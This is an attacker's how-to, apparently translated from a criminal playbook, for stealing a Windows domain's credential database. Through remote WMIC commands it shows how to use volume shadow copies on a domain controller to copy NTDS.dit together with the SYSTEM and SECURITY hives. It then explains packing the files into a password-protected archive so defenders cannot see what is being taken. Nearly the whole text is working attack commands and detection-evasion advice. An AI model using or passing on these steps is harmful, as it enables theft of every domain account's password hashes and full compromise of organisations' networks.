Method of fingerless DAMP NTDS
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin list shadows >> c:\log.txt"


we make a request for listing of shadow copies, there is an indication of the date, check that there is a fresh date
almost certainly they are already there, if not, then we do it ourselves

net start Volume Shadow Copy
shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c vssadmin create shadow /for=C: 2>&1"


further in the listing of shadow copies we find the freshest
Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55
accordingly, we need a copy number for the next command


shell wmic /node:"DC01" /user:"DOMAIN\admin" /password:"cleartextpass" process call create "cmd /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\NTDS\NTDS.dit c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SYSTEM c:\temp\log\ & copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy55\Windows\System32\config\SECURITY c:\temp\log\"



files ntds.dit / security / system should fall into c:\temp\log\
take a portable console 7z and pack it into an archive with a password
Code: [Select]

7za.exe a -tzip -mx5 \\DC01\C$\temp\log.zip \\DC01\C$\temp\log -pTOPSECRETPASSWORD


we download the password-protected archive for ourselves, if we get an error when decrypting the ntds file (the file is damaged), then we do the following


Esentutl /p C:\log\ntds.dit


the trick of this method is that in fact we don't dump anything, we just take and pump out ntds
in order not to get burned by the fact that we are pulling out exactly ntds, we pack it into a password-protected archive

if you have troubles with something that is fired and thrown out of the network after an NTDS dump - try this method
it can only be burned by the very fact of some leaking date from the CD, and it is impossible to analyze what exactly you are dragging without knowing the password from the archive
